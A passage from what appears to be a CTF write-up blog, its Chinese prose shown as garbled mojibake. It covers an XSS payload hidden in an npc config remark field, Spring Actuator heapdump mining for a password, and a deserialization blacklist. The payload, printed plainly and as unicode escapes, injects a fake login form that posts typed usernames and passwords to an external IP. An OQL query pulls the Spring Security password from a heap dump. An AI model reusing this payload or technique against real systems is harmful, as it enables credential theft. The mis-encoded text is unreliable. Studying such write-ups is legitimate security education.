class="keyword">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span><br><span class="line">                &lt;<span class="built_in">input</span> name=<span class="string">&quot;password&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;password&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;password&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;form-control&quot;</span> placeholder=<span class="string">&quot;Password&quot;</span> required=<span class="string">&quot;&quot;</span> langtag=<span class="string">&quot;word-password&quot;</span>&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;button onclick=<span class="string">&quot;fetch(&#x27;http://43.143.192.19:1145/&#x27;,&#123;method:&#x27;POST&#x27;,body:$(&#x27;#username&#x27;)[0].value+&#x27;___&#x27;+$(&#x27;#password&#x27;)[0].value&#125;);&quot;</span> langtag=<span class="string">&quot;word-login&quot;</span>&gt;Login&lt;/button&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¹ˆå¤æ‚æ•°æ®ä¼ è¾“èµ·æ¥ä¸æ–¹ä¾¿,ğŸ‘´ä¸å–œæ¬¢,æ¢ä¸€ä¸ª</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>unicodeå°±è¡Œ,è€Œä¸”æ§åˆ¶å°å¤§å¤§æ”¯æŒunicode</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr=node4.buuoj.cn:<span class="number">26658</span></span><br><span class="line">conn_type=tcp</span><br><span class="line">vkey=<span class="number">123</span></span><br><span class="line">remark=&lt;/a&gt;&lt;sCRiPt&gt;document.write`\u003c\u0068\u0074\u006d\u006c\u003e\u000a\u0020\u0020\u0020\u0020\u003c\u0068\u0065\u0061\u0064\u003e\u003c\u002f\u0068\u0065\u0061\u0064\u003e\u000a\u0020\u0020\u0020\u0020\u003c\u0062\u006f\u0064\u0079\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u0066\u006f\u0072\u006d\u0020\u0063\u006c\u0061\u0073\u0073\u003d\u0022\u006d\u002d\u0074\u0022\u0020\u006f\u006e\u0073\u0075\u0062\u006d\u0069\u0074\u003d\u0022\u0072\u0065\u0074\u0075\u0072\u006e\u0020\u0066\u0061\u006c\u0073\u0065\u0022\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u0064\u0069\u0076\u0020\u0063\u006c\u0061\u0073\u0073\u003d\u0022\u0066\u006f\u0072\u006d\u002d\u0067\u0072\u006f\u0075\u0070\u0022\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u0069\u006e\u0070\u0075\u0074\u0020\u006e\u0061\u006d\u0065\u003d\u0022\u0075\u0073\u0065\u0072\u006e\u0061\u006d\u0065\u0022\u0020\u0069\u0064\u003d\u0022\u0075\u0073\u0065\u0072\u006e\u0061\u006d\u0065\u0022\u0020\u0063\u006c\u0061\u0073\u0073\u003d\u0022\u0066\u006f\u0072\u006d\u002d\u0063\u006f\u006e\u0074\u0072\u006f\u006c\u0022\u0020\u0070\u006c\u0061\u0063\u0065\u0068\u006f\u006c\u0064\u0065\u0072\u003d\u0022\u0055\u0073\u0065\u0072\u006e\u0061\u006d\u0065\u0022\u0020\u0072\u0065\u0071\u0075\u0069\u0072\u0065\u0064\u003d\u0022\u0022\u0020\u006c\u0061\u006e\u0067\u0074\u0061\u0067\u003d\u0022\u0077\u006f\u0072\u0064\u002d\u0075\u0073\u0065\u0072\u006e\u0061\u006d\u0065\u0022\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u002f\u0064\u0069\u0076\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u0064\u0069\u0076\u0020\u0063\u006c\u0061\u0073\u0073\u003d\u0022\u0066\u006f\u0072\u006d\u002d\u0067\u0072\u006f\u0075\u0070\u0022\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u0069\u006e\u0070\u0075\u0074\u0020\u006e\u0061\u006d\u0065\u003d\u0022\u0070\u0061\u0073\u0073\u0077\u006f\u0072\u0064\u0022\u0020\u0069\u0064\u003d\u0022\u0070\u0061\u0073\u0073\u0077\u006f\u0072\u0064\u0022\u0020\u0074\u0079\u0070\u0065\u003d\u0022\u0070\u0061\u0073\u0073\u0077\u006f\u0072\u0064\u0022\u0020\u0063\u006c\u0061\u0073\u0073\u003d\u0022\u0066\u006f\u0072\u006d\u002d\u0063\u006f\u006e\u0074\u0072\u006f\u006c\u0022\u0020\u0070\u006c\u0061\u0063\u0065\u0068\u006f\u006c\u0064\u0065\u0072\u003d\u0022\u0050\u0061\u0073\u0073\u0077\u006f\u0072\u0064\u0022\u0020\u0072\u0065\u0071\u0075\u0069\u0072\u0065\u0064\u003d\u0022\u0022\u0020\u006c\u0061\u006e\u0067\u0074\u0061\u0067\u003d\u0022\u0077\u006f\u0072\u0064\u002d\u0070\u0061\u0073\u0073\u0077\u006f\u0072\u0064\u0022\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u002f\u0064\u0069\u0076\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u0062\u0075\u0074\u0074\u006f\u006e\u0020\u006f\u006e\u0063\u006c\u0069\u0063\u006b\u003d\u0022\u0066\u0065\u0074\u0063\u0068\u0028\u0027\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0034\u0033\u002e\u0031\u0034\u0033\u002e\u0031\u0039\u0032\u002e\u0031\u0039\u003a\u0031\u0031\u0034\u0035\u002f\u0027\u002c\u007b\u006d\u0065\u0074\u0068\u006f\u0064\u003a\u0027\u0050\u004f\u0053\u0054\u0027\u002c\u0062\u006f\u0064\u0079\u003a\u0024\u0028\u0027\u0023\u0075\u0073\u0065\u0072\u006e\u0061\u006d\u0065\u0027\u0029\u005b\u0030\u005d\u002e\u0076\u0061\u006c\u0075\u0065\u002b\u0027\u005f\u005f\u005f\u0027\u002b\u0024\u0028\u0027\u0023\u0070\u0061\u0073\u0073\u0077\u006f\u0072\u0064\u0027\u0029\u005b\u0030\u005d\u002e\u0076\u0061\u006c\u0075\u0065\u007d\u0029\u003b\u0022\u0020\u006c\u0061\u006e\u0067\u0074\u0061\u0067\u003d\u0022\u0077\u006f\u0072\u0064\u002d\u006c\u006f\u0067\u0069\u006e\u0022\u003e\u004c\u006f\u0067\u0069\u006e\u003c\u002f\u0062\u0075\u0074\u0074\u006f\u006e\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u002f\u0066\u006f\u0072\u006d\u003e\u000a\u0020\u0020\u0020\u0020\u003c\u002f\u0062\u006f\u0064\u0079\u003e\u000a\u003c\u002f\u0068\u0074\u006d\u006c\u003e`&lt;/sCrIpT&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./npc -config ./conf/npc.conf</span><br></pre></td></tr></table></figure>

<p><img src="D:\localmd\image\å¾®ä¿¡æˆªå›¾_20231101233054.png" alt="å¾®ä¿¡æˆªå›¾_20231101233054"></p>
<p>ç»ˆäºæ‹¿åˆ°äº†è‰¹,30sç‚¹ä¸€æ¬¡,ğŸ‘´tmä»¥ä¸ºxä¸è¿›å»äº†</p>
<p>ã¾ã ã¾ã ã­ã€å¼±ã„ï¼</p>
<h1 id="Deserialize-Upload"><a href="#Deserialize-Upload" class="headerlink" title="Deserialize?Upload!"></a>Deserialize?Upload!</h1><h2 id="actuatorğŸ˜«"><a href="#actuatorğŸ˜«" class="headerlink" title="actuatorğŸ˜«"></a>actuatorğŸ˜«</h2><p><img src="D:\localmd\image\å¾®ä¿¡æˆªå›¾_20231102082010.png" alt="å¾®ä¿¡æˆªå›¾_20231102082010"></p>
<p>é¦–å…ˆ,é¢˜ç›®æœ‰ä¸ªğŸš¢â™¥çš„ä¾èµ–,æ˜¾ç„¶ğŸ‘´ä¸çŸ¥é“è¿™æ˜¯å¹²å•¥çš„,æ€ä¹ˆåŠ,å­¦!</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/caoweixiong/p/15325382.html">Spring bootâ€”â€”Actuator è¯¦è§£ - æ›¹ä¼Ÿé›„ - åšå®¢å›­ (cnblogs.com)</a></p>
<p>é…ç½®æ–¹é¢</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>æœ‰äº†è¿™ä¸ªä¾èµ–,é‚£ä¹ˆSpringå°±ä¼šè‡ªåŠ¨å¼€æ”¾<code>/actuator/health</code>å’Œ<code>/actuator/info</code>è¿™ä¸¤ä¸ªè·¯å¾„</p>
<p>è®¿é—®<code>[127.0.0.1:9090/actuator/](http://127.0.0.1:9090/actuator/)</code>,å¯ä»¥å¾—åˆ°&#x2F;acturatorçš„è·¯ç”±</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;_links&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;self&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;href&quot;</span>: <span class="string">&quot;http://127.0.0.1:9090/actuator&quot;</span>,</span><br><span class="line">            <span class="string">&quot;templated&quot;</span>: <span class="literal">false</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;health&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;href&quot;</span>: <span class="string">&quot;http://127.0.0.1:9090/actuator/health&quot;</span>,</span><br><span class="line">            <span class="string">&quot;templated&quot;</span>: <span class="literal">false</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;health-path&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;href&quot;</span>: <span class="string">&quot;http://127.0.0.1:9090/actuator/health/&#123;*path&#125;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;templated&quot;</span>: <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;info&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;href&quot;</span>: <span class="string">&quot;http://127.0.0.1:9090/actuator/info&quot;</span>,</span><br><span class="line">            <span class="string">&quot;templated&quot;</span>: <span class="literal">false</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;env&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;href&quot;</span>: <span class="string">&quot;http://127.0.0.1:9090/actuator/env&quot;</span>,</span><br><span class="line">            <span class="string">&quot;templated&quot;</span>: <span class="literal">false</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;env-toMatch&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;href&quot;</span>: <span class="string">&quot;http://127.0.0.1:9090/actuator/env/&#123;toMatch&#125;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;templated&quot;</span>: <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;heapdump&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;href&quot;</span>: <span class="string">&quot;http://127.0.0.1:9090/actuator/heapdump&quot;</span>,</span><br><span class="line">            <span class="string">&quot;templated&quot;</span>: <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä»¥ä¸‹æ˜¯ä¸€äº›ç»å¸¸ä½¿ç”¨çš„è·¯å¾„</p>
<table>
<thead>
<tr>
<th align="center">HTTPæ–¹æ³•</th>
<th align="center">Endpoint</th>
<th align="center">Description</th>
</tr>
</thead>
<tbody><tr>
<td align="center">GET</td>
<td align="center">&#x2F;actuator</td>
<td align="center">æŸ¥çœ‹æœ‰å“ªäº›è·¯å¾„</td>
</tr>
<tr>
<td align="center">GET</td>
<td align="center">&#x2F;actuator&#x2F;env</td>
<td align="center">æŸ¥çœ‹æ‰€æœ‰ç¯å¢ƒå±æ€§,çœ‹Springçš„çš„properties,ä½†æ˜¯ä¼šè‡ªåŠ¨è„±æ•æ‰ä¸€äº›secret keyç­‰æ•æ„Ÿä¿¡æ¯</td>
</tr>
<tr>
<td align="center">GET</td>
<td align="center">&#x2F;actuator&#x2F;health</td>
<td align="center">æŸ¥çœ‹è¿è¡ŒæŒ‡æ ‡</td>
</tr>
<tr>
<td align="center">GET</td>
<td align="center">&#x2F;actuator&#x2F;info</td>
<td align="center">æŸ¥çœ‹ properties ä¸­ info å¼€å¤´çš„å±æ€§ï¼Œæ²’å•¥ç”¨</td>
</tr>
<tr>
<td align="center">GET</td>
<td align="center">&#x2F;actuator&#x2F;heapdump</td>
<td align="center">è·å–JVMçš„heap dump</td>
</tr>
</tbody></table>
<p>ğŸ¤£é»˜è®¤Actuator <code>/actuator/health</code>å’Œ<code>/actuator/info</code>ä¸¤ä¸ª endpointï¼Œå¦‚æœè¦å¼€æ”¾å…¶ä»– endpoint çš„è©±ï¼Œéœ€åœ¨åœ¨ application.properties ä¸­åšè®¾ç½®ã€‚<img src="D:\localmd\image\å¾®ä¿¡æˆªå›¾_20231102085646.png" alt="å¾®ä¿¡æˆªå›¾_20231102085646"></p>
<p>Heap dumpï¼ˆå †è½¬å‚¨ï¼‰æ˜¯æŒ‡å°†ä¸€ä¸ª Java è¿›ç¨‹çš„å†…å­˜ä¸­çš„å¯¹è±¡ä¿¡æ¯å’Œæ•°æ®ç»“æ„ä»¥äºŒè¿›åˆ¶æ ¼å¼å†™å…¥æ–‡ä»¶ï¼Œä»¥ä¾¿è¿›è¡Œå†…å­˜åˆ†æå’Œæ’æŸ¥å†…å­˜æ³„æ¼ç­‰é—®é¢˜ã€‚Heap dump åŒ…å«äº† Java å †å†…å­˜ä¸­çš„å¯¹è±¡å®ä¾‹ã€å¯¹è±¡å¼•ç”¨å…³ç³»ã€ç±»ä¿¡æ¯ç­‰ï¼Œå®ƒæ˜¯è¯Šæ–­å’Œè°ƒè¯• Java åº”ç”¨ç¨‹åºçš„é‡è¦å·¥å…·ä¹‹ä¸€ã€‚</p>
<p>ğŸ‘´è¯´ç‚¹äººè¯:åæ­£Heap dumpäº‹å†…å­˜ç›¸å…³çš„ä¸œè¥¿,è‚¯å®šæœ‰æ•æ„Ÿä¿¡æ¯,ğŸ‘´å°±æ˜¯è¦æŠŠå®ƒä¸‹ä¸‹æ¥è¿›è¡Œä¸€é€šä¹±è¶…,ä¸çŸ¥é“ä½ ä»¬æ€ä¹ˆå¿å¾—ä½çš„,äº‹ğŸ‘´ç›´æ¥æ‹¿èµ·æ¥ç‹ ç‹ åœ°åˆ†æ.</p>
<p>æ€ä¹ˆåˆ†æ,å½“æ—¶äº‹ç”¨jdkè‡ªå¸¦çš„jhat</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jhat -J-Xmx512M <span class="string">&quot;/path/to/heapdump&quot;</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±ä¼šæœ¬åœ°èµ·ä¸€ä¸ªæœåŠ¡å™¨,é‡Œé¢å°±åŠ è½½å†…å­˜çš„å†…å®¹</p>
<p>md,ä¾æ‰˜âœç‰¹,</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> SecurityFilterChain <span class="title function_">securityFilterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ((HttpSecurity)((FormLoginConfigurer)((FormLoginConfigurer)((HttpSecurity)((ExpressionUrlAuthorizationConfigurer.AuthorizedUrl)((ExpressionUrlAuthorizationConfigurer.AuthorizedUrl)http.authorizeRequests().antMatchers(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/&quot;</span>&#125;)).permitAll().antMatchers(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/admin/**&quot;</span>&#125;)).authenticated().and()).formLogin().loginProcessingUrl(<span class="string">&quot;/login&quot;</span>)).permitAll()).and()).csrf().disable();</span><br><span class="line">        <span class="keyword">return</span> (SecurityFilterChain)http.build();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>ğŸ§€springå®‰å…¨é…ç½®,<code>http.authorizeRequests().antMatchers(new String[]&#123;&quot;/&quot;&#125;).permitAll()</code>è¡¨ç¤ºå¯¹&#x2F;è·¯ç”±è®¿é—®å…è®¸ä»»æ„ç”¨æˆ·,</p>
<p><code>antMatchers(new String[]&#123;&quot;/admin/**&quot;&#125;).authenticated()</code>è¡¨ç¤º<code>/admin/</code>å¼€å¤´éªŒè¯ç”¨æˆ·</p>
<p><code>.formLogin().loginProcessingUrl(&quot;/login&quot;).permitAll()</code>&#x2F;loginçš„è¡¨è¾¾ç™»å½•ä¸éœ€è¦éªŒè¯</p>
<p>è¿™é‡Œå°±æ˜¯è®©ğŸ‘´æ‹¿åˆ°password</p>
<h2 id="é¢˜ç›®å®è·µğŸ˜“ğŸ˜¡"><a href="#é¢˜ç›®å®è·µğŸ˜“ğŸ˜¡" class="headerlink" title="é¢˜ç›®å®è·µğŸ˜“ğŸ˜¡"></a>é¢˜ç›®å®è·µğŸ˜“ğŸ˜¡</h2><p>wcsndm,sbä¸œè¥¿,é¢˜ç›®ç¯å¢ƒæ²¡äº†,è¡Œå§,ğŸ‘´æœ¬åœ°æ­ä¸€ä¸ª,nmdå¥—æ¨¡æ¿æ•´äº†ä¸ªdocker-compose,å‘Šè¯‰ğŸ‘´nmd<code>project name must not be empty</code>,ä½ tmdå€’æ˜¯å‘Šè¯‰ğŸ‘´å“ªé‡Œæ²¡æœ‰project name,é˜¿ç±³è¯ºæ–¯,ä¸€æ ¼å¾·æ‹‰ç±³.</p>
<p>åªèƒ½æ‰‹åŠ¨docker build.</p>
<p>åŒæ ·æ‹¿åˆ°heapdump</p>
<p>ç›´æ¥æ‰“å¼€</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jvisualvm</span><br></pre></td></tr></table></figure>

<p>åˆ«é—®ğŸ‘´å“ªé‡Œè£…,è¿™nmjavaè‡ªå¸¦çš„</p>
<p>è¿›è¡Œä¸€æ³¢OQLæŸ¥è¯¢</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select s from java.util.LinkedHashMap$Entry s where /spring.security.user.password/.test(s.key)</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œç”¨çš„äº‹æ­£åˆ™æµ‹è¯• &#x2F;rgexp&#x2F;.test()çš„å½¢å¼,è™½ç„¶é‡Œé¢å†…å®¹æ²¡ç”¨åˆ°å•¥æ­£åˆ™,åªæ˜¯èµ°ä¸ªå½¢å¼è€Œå·²,åˆ«é—®ğŸ‘´ä¸ºå•¥ä¸ç›´æ¥æŸ¥value,nmd valueæ˜¯ä¸ªå¯¹è±¡è¿˜æœªçŸ¥,ä½ æŸ¥ä¸ªâˆšâ‘§.</p>
<p><img src="D:\localmd\image\å¾®ä¿¡æˆªå›¾_20231102101315.png" alt="å¾®ä¿¡æˆªå›¾_20231102101315"></p>
<p>tmd &#x2F;loginç™»è¿›å»,è®©ğŸ‘´çœ‹çœ‹æ€ä¹ˆä¸ªäº‹</p>
<p><img src="D:\localmd\image\å¾®ä¿¡æˆªå›¾_20231102102004.png" alt="å¾®ä¿¡æˆªå›¾_20231102102004"></p>
<p>æºèµ–æ°ä¸€ä¸ªåå°ç®¡ç†ç³»ç»Ÿ,èƒ½ç”¨æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½çš„åœ°æ–¹.</p>
<h2 id="ååºåˆ—åŒ–åˆ†æğŸ˜›"><a href="#ååºåˆ—åŒ–åˆ†æğŸ˜›" class="headerlink" title="ååºåˆ—åŒ–åˆ†æğŸ˜›"></a>ååºåˆ—åŒ–åˆ†æğŸ˜›</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&#123;&quot;/deserialize&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">(<span class="meta">@RequestParam(&quot;b64str&quot;)</span> String b64str)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] serialized = Base64.getDecoder().decode(b64str);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line">        <span class="type">SafeObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SafeObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>å¾ˆç¾å¥½å¯¹å§,jacksoné“¾ç›´æ¥æ‰“,ä½†æ˜¯ğŸ‘´å‘ç°äº†ä¸å¯¹åŠ²,mdæœ‰æ¯’</p>
<p>è¿˜æ˜¯çœ‹çœ‹è¿œå¤„çš„<code>SafeObjectInputStream</code>å§</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">SafeObjectInputStream</span><span class="params">(InputStream is)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="built_in">super</span>(is);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass input) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">if</span> (BLACKLIST.contains(input.getName())) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;Hacker!!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(input);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        BLACKLIST.add(<span class="string">&quot;com.fasterxml.jackson.databind.node.POJONode&quot;</span>);</span><br><span class="line">        BLACKLIST.add(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);</span><br><span class="line">        BLACKLIST.add(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        BLACKLIST.add(<span class="string">&quot;java.security.SignedObject&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>éƒ½ç»™ä½ banäº†,rnm,å‡ºé¢˜äººçœŸçš„é˜´é™©,ç°åœ¨ä¸æŠŠjacksoné“¾banäº†,éƒ½ä¸æ•¢ååºåˆ—åŒ–äº†æ˜¯å§ğŸ˜…</p>
<p>æ€ä¹ˆç»˜ä¸–å‘¢</p>
<h2 id="æ–‡ä»¶ä¸Šä¼ -ååºåˆ—åŒ–ç»„åˆæ‹³ğŸ˜¤"><a href="#æ–‡ä»¶ä¸Šä¼ -ååºåˆ—åŒ–ç»„åˆæ‹³ğŸ˜¤" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ +ååºåˆ—åŒ–ç»„åˆæ‹³ğŸ˜¤"></a>æ–‡ä»¶ä¸Šä¼ +ååºåˆ—åŒ–ç»„åˆæ‹³ğŸ˜¤</h2><p>é¢˜ç›®ç»™äº†æ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½,é‚£æ€»ä¸èƒ½ä¸ç”¨å§,è¦ä¸ç„¶é¢˜ç›®æ•´è¿™Î²Ã·ç©æ„å¹²å˜›å‘€.ğŸ˜…</p>
<p>æ­£å¥½å‰é¢é€šè¿‡envæ³„éœ²å¾—çŸ¥java_homeçš„ä½ç½®</p>
<p><img src="D:\localmd\image\å¾®ä¿¡æˆªå›¾_20231102103809.png" alt="å¾®ä¿¡æˆªå›¾_20231102103809"></p>
<p>ä»€ä¹ˆ,ä½ ä¸çŸ¥é“java_homeäº‹å¹²å˜›çš„?</p>
<p>æ¥,è·ŸğŸ‘´ä¸€èµ·å¿µ:</p>
<p><code>JAVA_HOME</code> æ˜¯ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œç”¨äºæŒ‡ç¤º Java å¼€å‘å·¥å…·å’Œåº”ç”¨ç¨‹åºåœ¨è®¡ç®—æœºä¸Šçš„å®‰è£…ä½ç½®ã€‚å®ƒä¸»è¦ç”¨äºä»¥ä¸‹å‡ ä¸ªæ–¹é¢çš„ä½œç”¨ï¼š</p>
<ol>
<li><strong>Java å¼€å‘å·¥å…·çš„å®šä½</strong>ï¼š<code>JAVA_HOME</code> å˜é‡å‘Šè¯‰è®¡ç®—æœºçš„æ“ä½œç³»ç»Ÿå’Œå…¶ä»–å¼€å‘å·¥å…· Java å¼€å‘å·¥å…·çš„å®‰è£…ä½ç½®ã€‚è¿™å¯¹äºç¼–è¯‘ã€è¿è¡Œå’Œè°ƒè¯• Java ç¨‹åºéå¸¸é‡è¦ã€‚ä¾‹å¦‚ï¼Œå½“ä½ ä½¿ç”¨ Java ç¼–è¯‘å™¨ (<code>javac</code>) ç¼–è¯‘ Java ä»£ç æ—¶ï¼Œç³»ç»Ÿéœ€è¦çŸ¥é“ <code>JAVA_HOME</code> çš„ä½ç½®ä»¥æ‰¾åˆ° <code>javac</code> å¯æ‰§è¡Œæ–‡ä»¶ã€‚</li>
<li><strong>Java è¿è¡Œæ—¶ç¯å¢ƒï¼ˆJREï¼‰çš„å®šä½</strong>ï¼šé™¤äº†å¼€å‘å·¥å…·ï¼Œ<code>JAVA_HOME</code> ä¹Ÿå¯ä»¥ç”¨äºå®šä½ Java è¿è¡Œæ—¶ç¯å¢ƒï¼ˆJREï¼‰çš„ä½ç½®ã€‚JRE åŒ…å«äº†è¿è¡Œ Java åº”ç”¨ç¨‹åºæ‰€éœ€çš„ç±»åº“å’Œè¿è¡Œæ—¶ç»„ä»¶ã€‚å¦‚æœä½ çš„ç³»ç»Ÿä¸Šæœ‰å¤šä¸ªä¸åŒç‰ˆæœ¬çš„ Java å®‰è£…ï¼Œè®¾ç½® <code>JAVA_HOME</code> å¯ä»¥ç¡®ä¿ä½ ä½¿ç”¨çš„æ˜¯æ­£ç¡®çš„ Java ç‰ˆæœ¬ã€‚</li>
<li><strong>åº”ç”¨ç¨‹åºçš„å®šä½</strong>ï¼šæŸäº› Java åº”ç”¨ç¨‹åºå¯èƒ½éœ€è¦çŸ¥é“ Java çš„å®‰è£…ä½ç½®ï¼Œä»¥ä¾¿æ­£ç¡®é…ç½®è‡ªå·±ã€‚é€šè¿‡è®¾ç½® <code>JAVA_HOME</code> ç¯å¢ƒå˜é‡ï¼Œè¿™äº›åº”ç”¨ç¨‹åºå¯ä»¥è½»æ¾æ‰¾åˆ°æ‰€éœ€çš„ Java è¿è¡Œæ—¶ç¯å¢ƒã€‚</li>
